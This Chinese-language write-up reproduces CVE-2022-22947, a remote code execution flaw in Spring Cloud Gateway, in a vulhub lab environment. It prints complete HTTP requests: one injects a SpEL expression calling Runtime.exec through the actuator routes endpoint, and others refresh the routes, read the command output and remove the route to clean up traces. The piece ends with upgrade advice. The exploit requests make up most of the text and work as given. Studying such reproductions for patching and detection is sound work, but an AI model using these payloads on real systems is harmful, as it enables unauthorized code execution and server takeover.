Spring Cloud Gateway 是 Spring Cloud 下的一个项目，该项目是基于 Spring 5.0、Spring Boot 2.0 和
Project Reactor 等技术开发的网关，它是为微服务架构提供一种简单有效统一的 API 路由管理方式。

### 一、漏洞描述

Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）。使用 Spring Cloud Gateway
的应用如果对外暴露了 Gateway Actuator 接口，则可能存在被 CVE-2022-22947 漏洞利用的风险，攻击者可通过利用此漏洞执行
SpEL 表达式，从而在目标服务器上执行任意恶意代码，获取系统权限。

### 二、影响版本

Spring Cloud Gateway 3.1.x < 3.1.1

Spring Cloud Gateway 3.0.x < 3.0.7

### 三、漏洞复现

本地环境：KaLi Linux

复现环境：vulhub

首先安装kali和vulhub，vulhub的安装教程https://vulhub.org/#/docs/

之后进入到vulhub项目中

![1648002720_623a86a0a3ed0218e239f.png!small?1648002724720](https://image.3001.net/images/20220323/1648002720_623a86a0a3ed0218e239f.png!small?1648002724720)

### 复现此漏洞需要以下步骤：

首先准备一个payload,目的是发送一个数据包添加一个恶意SplEL表达式的路由：

payload

    
    
    POST /actuator/gateway/routes/hacktest HTTP/1.1   
    Host: X.X.X.X:8080   
    Cache-Control: max-age=0   
    Upgrade-Insecure-Requests: 1   
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36   
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9   
    Accept-Encoding: gzip, deflate   
    Accept-Language: zh-CN,zh;q=0.9   
    If-None-Match: "3147526947+gzip"   
    If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT   
    Connection: close   
    Content-Type: application/json   
    Content-Length: 330   
      
    {   
    "id": "hacktest",   
    "filters": [{   
     "name": "AddResponseHeader",   
     "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}   
    }],   
    "uri": "http://example.com",   
    "order": 0   
    } 
    
    

  

![1648002720_623a86a00c0d4f44c15ef.png!small?1648002724720](https://image.3001.net/images/20220323/1648002720_623a86a00c0d4f44c15ef.png!small?1648002724720)

第二步发送数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行

    
    
    POST /actuator/gateway/refresh HTTP/1.1
    
    Host: 192.168.254.128:8080
    
    Upgrade-Insecure-Requests: 1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: zh-CN,zh;q=0.9
    
    Connection: close
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 328
    
    
    
    {
    
      "id": "hacktest",
    
      "filters": [{
    
        "name": "AddResponseHeader",
    
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
    
      }],
    
    "uri": "http://example.com",
    
    "order": 0
    
    }

![1648002813_623a86fda18e10bba5576.png!small?1648002814022](https://image.3001.net/images/20220323/1648002813_623a86fda18e10bba5576.png!small?1648002814022)

发送如下数据包即可查看执行结果：

    
    
    GET /actuator/gateway/routes/hacktest HTTP/1.1
    
    Host: 192.168.254.128:8080
    
    Cache-Control: max-age=0
    
    Upgrade-Insecure-Requests: 1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: zh-CN,zh;q=0.9
    
    If-None-Match: "3147526947+gzip"
    
    If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 328
    
    
    
    {
    
      "id": "hacktest",
    
      "filters": [{
    
        "name": "AddResponseHeader",
    
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
    
      }],
    
    "uri": "http://example.com",
    
    "order": 0
    
    }

![1648003575_623a89f79d9394468ae5a.png!small?1648003576194](https://image.3001.net/images/20220323/1648003575_623a89f79d9394468ae5a.png!small?1648003576194)

最后，发送如下数据包清理现场，删除所添加的路由：

    
    
    DELETE /actuator/gateway/routes/hacktest HTTP/1.1
    
    Host: X.X.X.X:8080
    
    Cache-Control: max-age=0
    
    Upgrade-Insecure-Requests: 1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: zh-CN,zh;q=0.9
    
    If-None-Match: "3147526947+gzip"
    
    If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
    
    Content-Length: 348
    
    
    
    
    
    {
    
    
    
      "id": "hacktest",
    
    
    
      "filters": [{
    
    
    
        "name": "AddResponseHeader",
    
    
    
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
    
    
    
      }],
    
    
    
    "uri": "http://example.com",
    
    
    
    "order": 0
    
    
    
    }
    
    

![1648003522_623a89c2ad0b17aad2368.png!small?1648003523091](https://image.3001.net/images/20220323/1648003522_623a89c2ad0b17aad2368.png!small?1648003523091)

四、修复建议

针对3.1.x版本，建议升级至3.1.1及其以上版本；  
针对3.0.x版本，建议升级至3.0.7及其以上版本；其余官方不再维护版本均建议升级至最新版本。

###

